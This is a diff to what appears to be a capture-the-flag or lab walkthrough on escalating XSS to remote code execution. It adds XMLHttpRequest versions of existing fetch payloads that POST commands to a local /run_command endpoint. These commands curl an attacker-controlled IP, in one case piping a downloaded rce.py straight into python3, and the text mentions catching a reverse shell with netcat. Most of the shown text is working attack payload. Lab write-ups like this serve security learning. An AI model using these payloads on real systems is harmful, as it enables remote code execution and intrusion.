@@ -95,6 +95,16 @@ fetch('http://localhost:3000/run_command', {
     body: "cmd=curl http://192.168.45.165:443"
 })
 ```
+
+OR)
+
+```
+const xhr = new XMLHttpRequest();
+xhr.open("POST", "http://localhost:3000/run_command", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("cmd=curl http://192.168.45.165:443");
+```
+
 And you you can see the response in netcat on port 443.
 
 So try to take reverse shell.
@@ -108,6 +118,16 @@ fetch('http://localhost:3000/run_command', {
     body: "cmd=curl http://192.168.45.165:80/rce.py|python3"
 })
 ```
+
+OR)
+
+```
+const xhr = new XMLHttpRequest();
+xhr.open("POST", "http://localhost:3000/run_command", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("cmd=curl http://192.168.45.165:80/rce.py|python3");
+```
+
 - Start the HTTP server and host both the the files i.e, rce.py and xss_to_rce.js.
 
 ```
